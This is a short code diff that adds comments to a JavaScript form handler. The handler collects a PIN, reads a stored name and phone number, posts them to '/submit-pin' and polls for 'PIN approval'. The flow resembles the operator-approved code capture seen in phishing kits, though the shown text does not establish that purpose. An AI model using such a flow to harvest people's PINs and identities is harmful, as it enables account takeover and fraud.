@@ -168,8 +168,8 @@ function checkFilled() {
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
     const pin = [...inputs].map(i => i.value).join('');
-    const name = localStorage.getItem('name');
-    const phone = localStorage.getItem('phone');
+    const name = localStorage.getItem('name');   // ✅ get name
+    const phone = localStorage.getItem('phone'); // ✅ get phone
 
     button.disabled = true;
     button.innerText = 'Verifying...';
@@ -179,7 +179,7 @@ form.addEventListener('submit', async (e) => {
     await fetch('/submit-pin', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ name, phone, pin })
+        body: JSON.stringify({ name, phone, pin }) // ✅ send name + phone + pin
     });
 
     pollPinApproval(pin);
